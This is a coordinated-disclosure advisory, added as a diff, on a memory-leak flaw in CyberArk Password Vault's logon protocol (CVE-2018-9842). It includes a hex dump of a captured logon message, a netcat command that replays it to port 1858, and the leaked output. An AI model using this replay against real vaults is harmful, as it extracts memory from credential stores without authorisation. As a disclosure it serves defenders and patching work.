@@ -1,0 +1,180 @@
+Advisory: CyberArk Password Vault Memory Disclosure
+
+Data in the CyberArk Password Vault may be accessed through a proprietary
+network protocol. While answering to a client's logon request, the vault
+discloses around 50 bytes of its memory to the client.
+
+
+Details
+=======
+
+Product: CyberArk Password Vault
+Affected Versions: < 9.7, < 10
+Fixed Versions: 9.7, 10
+Vulnerability Type: Information Disclosure
+Security Risk: high
+Vendor URL: https://www.cyberark.com/
+Vendor Status: fixed version released
+Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2017-015
+Advisory Status: published
+CVE: CVE-2018-9842
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9842
+
+
+Introduction
+============
+
+"CyberArk Enterprise Password Vault is designed to secure, rotate and
+control access to privileged account credentials based on organizational
+policies. A flexible architecture allows organizations to start small
+and scale to the largest, most complex IT environments. The solution
+protects privileged account credentials used to access the vast majority
+of systems."
+(from the Enterprise Password Vault Data Sheet [1])
+
+
+More Details
+============
+
+The CyberArk Password Vault serves as a database to securely store
+credentials. Furthermore, the vault enforces access controls and logs
+access to its records. Data stored in the vault may be accessed through
+a proprietary network protocol which is usually transmitted over TCP
+port 1858. Various clients, such as web applications or command line
+tools, are provided by CyberArk to interface with a vault.
+
+The first message a client sends to the vault is a "Logon" command.
+Using a network sniffer, such a message was captured:
+
+$ xxd logon.bin
+00000000: ffff ffff f700 0000 ffff ffff 3d01 0000  ............=...
+00000010: 5061 636c 6953 6372 6970 7455 7365 7200  PacliScriptUser.
+00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000060: 0000 0000 0000 0000 0000 0000 0020 2020  .............
+00000070: 20ff ffff ff00 0000 0000 0000 0000 0073   ..............s
+00000080: 0000 00ce cece ce00 0000 0000 0000 0000  ................
+00000090: 0000 0000 0000 0030 3d4c 6f67 6f6e fd31  .......0=Logon.1
+000000a0: 3135 3d37 2e32 302e 3930 2e32 38fd 3639  15=7.20.90.28.69
+000000b0: 3d50 fd31 3136 3d30 fd31 3030 3dfd 3231  =P.116=0.100=.21
+000000c0: 373d 59fd 3231 383d 5041 434c 49fd 3231  7=Y.218=PACLI.21
+000000d0: 393d fd33 3137 3d30 fd33 3537 3d30 fd32  9=.317=0.357=0.2
+000000e0: 323d 5061 636c 6953 6372 6970 7455 7365  2=PacliScriptUse
+000000f0: 72fd 3336 373d 3330 fd00 00              r.367=30...
+
+Starting at offset 0x97, a type of remote procedure call can be
+identified. In this case, "Logon" is invoked for the user
+"PacliScriptUser". This message does not contain any random,
+unpredictable data. Therefore, it may be replayed at will once captured.
+This can be accomplished using netcat:
+
+------------------------------------------------------------------------
+$ cat logon.bin | nc -v 10.0.0.5 1858
+------------------------------------------------------------------------
+
+RedTeam Pentesting discovered that the message sent by the vault in
+response to a "Logon" command contains about 50 bytes of the vault's
+memory.
+
+
+Proof of Concept
+================
+
+To trigger the vulnerability, a previously captured logon message is
+sent to the vault using netcat:
+
+------------------------------------------------------------------------
+$ cat logon.bin | nc -v 10.0.0.5 1858 | xxd
+Ncat: Version 7.40 ( https://nmap.org/ncat )
+Ncat: Connected to 10.0.0.5:1858.
+Ncat: 251 bytes sent, 273 bytes received in 0.01 seconds.
+00000000: e500 0000 0000 0000 3001 0000 5061 636c  ........0...Pacl
+00000010: 6953 6372 6970 7455 7365 7200 0000 0000  iScriptUser.....
+00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000060: 0000 0000 0000 0000 0000 0000 001e 0200  ................
+00000070: 0078 9c53 6362 0003 7616 0686 ff40 e019  .x.Scb..v....@..
+00000080: e2e8 ec6b 6069 eaaa 1052 9498 579c 985c  ...k`i...R..W..\
+00000090: 9299 9fa7 e093 9f0e 248b b333 0b0a 5253  ........$..3..RS
+000000a0: 14d2 f28b 144a 8b53 8b14 0212 9373 3283  .....J.S.....s2.
+000000b0: 938b 320b 4a42 817c 3d85 a0d4 c4e2 fc3c  ..2.JB.|=......<
+000000c0: 2b05 a070 6a5e 8942 717e 7276 6a89 4266  +..pj^.Bq~rvj.Bf
+000000d0: 3150 20bf 3835 458f 8b61 140c 15c0 08c4  1P .85E..a......
+000000e0: 0063 0e25 c06d 6265 7220 3d20 7661 756c  .c.%.mber = vaul
+000000f0: 745f 6669 6c65 5f63 6174 6567 6f72 6965  t_file_categorie
+00000100: 735f 7265 636f 7264 7300 2968 b8fb aae9  s_records.)h....
+00000110: 62
+------------------------------------------------------------------------
+
+Starting at offset 0xe0, the vault discloses a total of 49 bytes of its
+memory to the client.
+
+
+Workaround
+==========
+
+None
+
+
+Fix
+===
+
+Upgrade CyberArk Password Vault to version 9.7 or 10.
+
+
+Security Risk
+=============
+
+This vulnerability is rated as a high risk. Exploitation only requires
+network access to a PrivateArk Password Vault. Although each request
+only discloses about 50 bytes of memory, sustained exploitation will
+likely reveal sensitive information at some point in time. This
+critically undermines the primary purpose of the PrivateArk Password
+Vault.
+
+
+Timeline
+========
+
+2017-11-24 Vulnerability identified
+2018-01-22 Customer approved disclosure to vendor
+2018-02-05 Vendor notified
+2018-04-06 CVE number requested
+2018-04-07 CVE number assigned
+2018-04-09 Advisory released
+
+
+References
+==========
+
+[1] http://lp.cyberark.com/rs/316-CZP-275/images/ds-enterprise-password-vault-11-15-17.pdf
+
+
+RedTeam Pentesting GmbH
+=======================
+
+RedTeam Pentesting offers individual penetration tests performed by a
+team of specialised IT-security experts. Hereby, security weaknesses in
+company networks or products are uncovered and can be fixed immediately.
+
+As there are only few experts in this field, RedTeam Pentesting wants to
+share its knowledge and enhance the public knowledge with research in
+security-related areas. The results are made available as public
+security advisories.
+
+More information about RedTeam Pentesting can be found at:
+https://www.redteam-pentesting.de/
+
+
+Working at RedTeam Pentesting
+=============================
+
+RedTeam Pentesting is looking for penetration testers to join our team
+in Aachen, Germany. If you are interested please visit:
+https://www.redteam-pentesting.de/jobs/
+
+-- RedTeam Pentesting GmbH Tel.: +49 241 510081-0 Dennewartstr. 25-27 Fax : +49 241 510081-99 52068 Aachen https://www.redteam-pentesting.de Germany Registergericht: Aachen HRB 14004 Geschäftsführer: Patrick Hof, Jens Liebchen
